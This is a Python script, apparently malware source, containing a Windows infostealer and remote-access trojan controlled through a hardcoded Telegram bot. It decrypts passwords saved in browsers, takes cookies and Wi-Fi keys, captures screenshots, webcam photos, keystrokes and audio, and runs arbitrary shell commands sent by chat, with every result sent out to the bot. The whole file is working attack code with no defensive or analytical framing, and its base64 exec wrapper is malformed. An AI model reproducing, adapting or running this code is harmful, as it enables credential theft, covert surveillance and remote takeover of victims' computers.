import base64, os, sys
exec(base64.b64decode("
import os
import sqlite3
import base64
import json
import platform
import requests
import tempfile
import shutil
import winreg
import subprocess
import sys
import threading
import socket
import getpass
import datetime
import time
from threading import Thread

# Установка зависимостей
def install_deps():
    packages = ["requests", "pycryptodome", "browser-cookie3", "pywin32", "pillow", "pynput", "pyaudio", "opencv-python", "numpy"]
    for package in packages:
        try:
            if package == "pywin32": __import__("win32crypt")
            elif package == "pillow": __import__("PIL")
            elif package == "browser-cookie3": __import__("browser_cookie3")
            elif package == "pynput": __import__("pynput")
            elif package == "pyaudio": __import__("pyaudio")
            elif package == "opencv-python": __import__("cv2")
            else: __import__(package)
        except:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--user", "--quiet"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except: pass

install_deps()

# Импорты после установки
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import win32crypt
import browser_cookie3
from PIL import ImageGrab
from pynput import keyboard
import pyaudio
import wave
import cv2
import numpy as np

TELEGRAM_BOT_TOKEN = "8241800951:AAFL1ZCdruXnPg-0Y09plAphGHEWLtwBcm4"
TELEGRAM_CHAT_ID = "7745925686"

class KeyLogger:
    def __init__(self): self.log = ""; self.listener = None
    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char: self.log += key.char
            elif key == keyboard.Key.space: self.log += " "
            elif key == keyboard.Key.enter: self.log += "\n"
            elif key == keyboard.Key.backspace: self.log = self.log[:-1]
            else: self.log += f" [{key}] "
            if len(self.log) > 100: self.save_log()
        except: pass
    def save_log(self):
        try:
            with open(os.path.join(tempfile.gettempdir(), "keylog.txt"), "a", encoding="utf-8") as f:
                f.write(self.log); self.log = ""
        except: pass
    def start(self):
        try: self.listener = keyboard.Listener(on_press=self.on_press); self.listener.start(); return True
        except: return False
    def stop(self):
        if self.listener: self.listener.stop()
        self.save_log()

class AudioRecorder:
    def __init__(self): self.recording = False; self.frames = []
    def record_audio(self):
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=2, rate=44100, input=True, frames_per_buffer=1024)
            self.frames = []; self.recording = True
            while self.recording: self.frames.append(stream.read(1024))
            stream.stop_stream(); stream.close(); p.terminate(); self.save_recording()
        except: pass
    def save_recording(self):
        try:
            wf = wave.open(os.path.join(tempfile.gettempdir(), "audio_record.wav"), 'wb')
            wf.setnchannels(2); wf.setsampwidth(2); wf.setframerate(44100)
            wf.writeframes(b''.join(self.frames)); wf.close()
        except: pass
    def start(self):
        self.recording = True
        self.record_thread = Thread(target=self.record_audio)
        self.record_thread.daemon = True; self.record_thread.start()
    def stop(self): self.recording = False

class AdvancedStealer:
    def __init__(self):
        self.data = {"passwords": [], "cookies": [], "screenshots": [], "system_info": {}, "wifi_passwords": []}
    
    def get_master_key(self, browser_path):
        try:
            with open(os.path.join(browser_path, "Local State"), 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        except: return None

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]; payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            try: return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
            except: return ""

    def steal_browser_passwords(self):
        browsers = {
            "Chrome": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data"),
            "Opera": os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
            "Edge": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            "Yandex": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"),
            "Vivaldi": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Vivaldi", "User Data")
        }
        for browser_name, browser_path in browsers.items():
            try:
                if os.path.exists(browser_path): self.steal_chrome_based_passwords(browser_path, browser_name)
            except: continue

    def steal_chrome_based_passwords(self, browser_path, browser_name):
        try:
            master_key = self.get_master_key(browser_path)
            if not master_key: return
            login_data_path = os.path.join(browser_path, "Default", "Login Data")
            if not os.path.exists(login_data_path): return
            temp_db = os.path.join(tempfile.gettempdir(), "temp_login.db")
            shutil.copy2(login_data_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if url and username and encrypted_password:
                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
                    if decrypted_password:
                        self.data["passwords"].append({
                            "browser": browser_name, "url": url, "username": username, "password": decrypted_password
                        })
            conn.close(); os.remove(temp_db)
        except: pass

    def steal_cookies(self):
        try:
            for browser_name in ['chrome', 'opera', 'edge', 'brave', 'vivaldi']:
                try:
                    cj = getattr(browser_cookie3, browser_name)()
                    for cookie in cj:
                        self.data["cookies"].append({
                            "browser": browser_name, "domain": cookie.domain, "name": cookie.name, "value": cookie.value
                        })
                except: continue
        except: pass

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
            screenshot.save(screenshot_path)
            with open(screenshot_path, "rb") as f:
                self.data["screenshots"].append(base64.b64encode(f.read()).decode())
            os.remove(screenshot_path)
        except: pass

    def get_wifi_passwords(self):
        try:
            if platform.system() == "Windows":
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True).decode('cp866').split('\n')
                profiles = [i.split(":")[1][1:-1] for i in results if "Все профили пользователей" in i]
                for profile in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], shell=True).decode('cp866').split('\n')
                        password = [b.split(":")[1][1:-1] for b in results if "Содержимое ключа" in b]
                        if password: self.data["wifi_passwords"].append({"ssid": profile, "password": password[0]})
                    except: continue
        except: pass

    def get_system_info(self):
        try:
            self.data["system_info"] = {
                "username": getpass.getuser(), "computer_name": platform.node(),
                "os": platform.system() + " " + platform.release(), "processor": platform.processor(),
                "architecture": platform.architecture()[0], "timestamp": str(datetime.datetime.now())
            }
        except: pass

    def send_to_telegram(self):
        try:
            message = f"🔍 *СТИЛЛЕР АКТИВИРОВАН*\n\n*Система:* {self.data['system_info'].get('username', 'N/A')}@{self.data['system_info'].get('computer_name', 'N/A')}\n*Пароли:* {len(self.data['passwords'])}\n*Cookies:* {len(self.data['cookies'])}\n*Wi-Fi:* {len(self.data['wifi_passwords'])}\n\n🤖 Бот готов к управлению!"
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
            if self.data["passwords"]:
                passwords_text = "*🔑 Найденные пароли:*\n"
                for pwd in self.data["passwords"][:10]:
                    passwords_text += f"🌐 {pwd['browser']}: {pwd['url']}\n👤 {pwd['username']}\n🔐 {pwd['password']}\n\n"
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={"chat_id": TELEGRAM_CHAT_ID, "text": passwords_text[:4000], "parse_mode": "Markdown"})
            if self.data["screenshots"]:
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto", data={"chat_id": TELEGRAM_CHAT_ID}, files={"photo": ("screenshot.png", base64.b64decode(self.data["screenshots"][0]))})
        except: pass

    def run(self):
        self.get_system_info(); self.steal_browser_passwords(); self.steal_cookies()
        self.get_wifi_passwords(); self.take_screenshot(); self.send_to_telegram()

class TelegramController:
    def __init__(self):
        self.last_update_id = 0; self.keylogger = KeyLogger(); self.audio_recorder = AudioRecorder()
        self.commands_handlers = {
            'steal_passwords': self.steal_passwords_command, 'screenshot': self.screenshot_command,
            'webcam': self.webcam_command, 'keylogger_start': self.keylogger_start_command,
            'keylogger_stop': self.keylogger_stop_command, 'keylogger_get': self.keylogger_get_command,
            'system_info': self.system_info_command, 'wifi_passwords': self.wifi_passwords_command,
            'shell': self.shell_command, 'download_file': self.download_file_command,
            'upload_file': self.upload_file_command, 'process_list': self.process_list_command,
            'kill_process': self.kill_process_command, 'shutdown': self.shutdown_command,
            'restart': self.restart_command, 'lock_screen': self.lock_screen_command,
            'audio_start': self.audio_start_command, 'audio_stop': self.audio_stop_command,
            'audio_get': self.audio_get_command, 'full_scan': self.full_scan_command
        }
    
    def send_message(self, text, reply_markup=None):
        try:
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
            if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data=data)
        except: pass

    def send_photo(self, photo_data, caption=""):
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                files={"photo": ("screenshot.png", photo_data)}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption})
        except: pass

    def send_document(self, file_data, filename, caption=""):
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                files={"document": (filename, file_data)}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption})
        except: pass

    def get_updates(self):
        try:
            response = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates",
                params={"offset": self.last_update_id + 1, "timeout": 30}, timeout=35)
            return response.json().get("result", [])
        except: return []

    def create_keyboard(self):
        return {"inline_keyboard": [
            [{"text": "🔑 Украсть пароли", "callback_data": "steal_passwords"}, {"text": "📸 Скриншот", "callback_data": "screenshot"}],
            [{"text": "🎥 Вебкамера", "callback_data": "webcam"}, {"text": "⌨️ Кейлоггер ВКЛ", "callback_data": "keylogger_start"}],
            [{"text": "⏹️ Кейлоггер ВЫКЛ", "callback_data": "keylogger_stop"}, {"text": "📁 Получить лог", "callback_data": "keylogger_get"}],
            [{"text": "💻 Системная информация", "callback_data": "system_info"}, {"text": "📶 WiFi пароли", "callback_data": "wifi_passwords"}],
            [{"text": "⚡ Командная строка", "callback_data": "shell"}, {"text": "📁 Скачать файл", "callback_data": "download_file"}],
            [{"text": "📤 Загрузить файл", "callback_data": "upload_file"}, {"text": "📊 Процессы", "callback_data": "process_list"}],
            [{"text": "🔴 Выключить ПК", "callback_data": "shutdown"}, {"text": "🔄 Перезагрузить", "callback_data": "restart"}],
            [{"text": "🔒 Заблокировать экран", "callback_data": "lock_screen"}, {"text": "🎙️ Запись звука ВКЛ", "callback_data": "audio_start"}],
            [{"text": "⏹️ Запись звука ВЫКЛ", "callback_data": "audio_stop"}, {"text": "📁 Получить запись", "callback_data": "audio_get"}],
            [{"text": "🚀 ПОЛНЫЙ СКАН", "callback_data": "full_scan"}]
        ]}

    def send_main_menu(self):
        menu_text = f"🤖 *УДАЛЕННОЕ УПРАВЛЕНИЕ*\n\n💻 *Система:* {platform.node()}\n👤 *Пользователь:* {getpass.getuser()}\n🖥️ *ОС:* {platform.system()} {platform.release()}\n\nВыберите действие:"
        self.send_message(menu_text, self.create_keyboard())

    def steal_passwords_command(self):
        self.send_message("🔄 Краду пароли..."); stealer = AdvancedStealer()
        stealer.steal_browser_passwords(); stealer.steal_cookies()
        if stealer.data["passwords"]:
            passwords_text = "🔑 *Найденные пароли:*\n\n"
            for pwd in stealer.data["passwords"][:15]:
                passwords_text += f"*{pwd['browser']}:*\n🌐 `{pwd['url']}`\n👤 `{pwd['username']}`\n🔐 `{pwd['password']}`\n\n"
            self.send_message(passwords_text[:4000])
        else: self.send_message("❌ Пароли не найдены")

    def screenshot_command(self):
        self.send_message("📸 Делаю скриншот...")
        try:
            screenshot = ImageGrab.grab(); screenshot_path = os.path.join(tempfile.gettempdir(), "tg_screenshot.png")
            screenshot.save(screenshot_path)
            with open(screenshot_path, "rb") as f: self.send_photo(f.read(), "📸 Актуальный скриншот")
            os.remove(screenshot_path)
        except: self.send_message("❌ Ошибка скриншота")

    def webcam_command(self):
        self.send_message("🎥 Пытаюсь сделать фото с вебкамеры...")
        try:
            cap = cv2.VideoCapture(0); ret, frame = cap.read()
            if ret:
                webcam_path = os.path.join(tempfile.gettempdir(), "webcam.jpg"); cv2.imwrite(webcam_path, frame)
                with open(webcam_path, "rb") as f: self.send_photo(f.read(), "🎥 Фото с вебкамеры")
                os.remove(webcam_path)
            cap.release()
        except: self.send_message("❌ Вебкамера недоступна")

    def keylogger_start_command(self):
        if self.keylogger.start(): self.send_message("⌨️ Кейлоггер АКТИВИРОВАН")
        else: self.send_message("❌ Ошибка активации")

    def keylogger_stop_command(self): self.keylogger.stop(); self.send_message("⏹️ Кейлоггер ОСТАНОВЛЕН")

    def keylogger_get_command(self):
        self.send_message("📁 Отправляю лог...")
        try:
            log_path = os.path.join(tempfile.gettempdir(), "keylog.txt")
            if os.path.exists(log_path):
                with open(log_path, "rb") as f: self.send_document(f.read(), "keylog.txt", "⌨️ Лог кейлоггера")
            else: self.send_message("❌ Файл лога не найден")
        except: self.send_message("❌ Ошибка отправки")

    def system_info_command(self):
        self.send_message("💻 Собираю информацию...")
        try:
            info_text = f"*💻 СИСТЕМНАЯ ИНФОРМАЦИЯ*\n\n*👤 Пользователь:* {getpass.getuser()}\n*🖥️ Имя ПК:* {platform.node()}\n*⚙️ ОС:* {platform.system()} {platform.release()}\n*🔧 Архитектура:* {platform.architecture()[0]}\n*💾 Процессор:* {platform.processor()}\n*📁 Рабочая директория:* {os.getcwd()}\n*🕐 Время системы:* {datetime.datetime.now()}\n*🌐 IP адрес:* {socket.gethostbyname(socket.gethostname())}"
            self.send_message(info_text)
        except: self.send_message("❌ Ошибка")

    def wifi_passwords_command(self):
        self.send_message("📶 Ищу WiFi пароли..."); stealer = AdvancedStealer(); stealer.get_wifi_passwords()
        if stealer.data["wifi_passwords"]:
            wifi_text = "📶 *Найденные WiFi сети:*\n\n"
            for wifi in stealer.data["wifi_passwords"]: wifi_text += f"*{wifi['ssid']}* - `{wifi['password']}`\n"
            self.send_message(wifi_text)
        else: self.send_message("❌ WiFi пароли не найдены")

    def shell_command(self): self.send_message("⚡ Режим командной строки активирован. Отправляйте команды в чат.")
    def download_file_command(self): self.send_message("📁 Режим скачивания активирован. Отправьте полный путь к файлу.")
    def upload_file_command(self): self.send_message("📤 Режим загрузки активирован. Отправьте файл в Telegram.")

    def process_list_command(self):
        self.send_message("📊 Получаю список процессов...")
        try:
            if platform.system() == "Windows": result = subprocess.check_output("tasklist", shell=True).decode('cp866')
            else: result = subprocess.check_output("ps aux", shell=True).decode()
            self.send_message(f"```\n{result[:4000]}\n```")
        except: self.send_message("❌ Ошибка")

    def kill_process_command(self): self.send_message("🔪 Для завершения процесса отправьте его PID или имя.")

    def shutdown_command(self):
        self.send_message("🔴 Выключаю компьютер...")
        try:
            if platform.system() == "Windows": os.system("shutdown /s /t 5")
            else: os.system("shutdown -h now")
        except: pass

    def restart_command(self):
        self.send_message("🔄 Перезагружаю компьютер...")
        try:
            if platform.system() == "Windows": os.system("shutdown /r /t 5")
            else: os.system("reboot")
        except: pass

    def lock_screen_command(self):
        self.send_message("🔒 Блокирую экран...")
        try:
            if platform.system() == "Windows": os.system("rundll32.exe user32.dll,LockWorkStation")
        except: pass

    def audio_start_command(self):
        self.send_message("🎙️ Запись звука АКТИВИРОВАНА (60 секунд)"); self.audio_recorder.start()
        def auto_stop(): time.sleep(60); self.audio_stop_command()
        Thread(target=auto_stop).start()

    def audio_stop_command(self): self.send_message("⏹️ Запись звука ОСТАНОВЛЕНА"); self.audio_recorder.stop()

    def audio_get_command(self):
        self.send_message("📁 Отправляю запись...")
        try:
            audio_path = os.path.join(tempfile.gettempdir(), "audio_record.wav")
            if os.path.exists(audio_path):
                with open(audio_path, "rb") as f: self.send_document(f.read(), "audio_record.wav", "🎙️ Запись звука")
            else: self.send_message("❌ Файл записи не найден")
        except: self.send_message("❌ Ошибка отправки")

    def full_scan_command(self):
        self.send_message("🚀 ЗАПУСК ПОЛНОГО СКАНА..."); stealer = AdvancedStealer(); stealer.run(); self.send_message("✅ Сканирование завершено")

    def handle_callback(self, callback_data):
        handler = self.commands_handlers.get(callback_data)
        if handler: handler()
        else: self.send_message("❌ Неизвестная команда")

    def start_listening(self):
        self.send_main_menu()
        while True:
            try:
                updates = self.get_updates()
                for update in updates:
                    self.last_update_id = update["update_id"]
                    if "callback_query" in update: self.handle_callback(update["callback_query"]["data"])
                    elif "message" in update and "text" in update["message"]:
                        text = update["message"]["text"]
                        if text == "/menu": self.send_main_menu()
                        elif text.startswith("/cmd "):
                            try:
                                result = subprocess.check_output(text[5:], shell=True, stderr=subprocess.STDOUT).decode('cp866')
                                self.send_message(f"```\n{result[:4000]}\n```")
                            except Exception as e: self.send_message(f"❌ Ошибка: {str(e)}")
                time.sleep(1)
            except: time.sleep(5)

if __name__ == "__main__":
    stealer = AdvancedStealer(); stealer.run()
    controller = TelegramController()
    Thread(target=controller.start_listening).start()
    while True: time.sleep(60)
"))
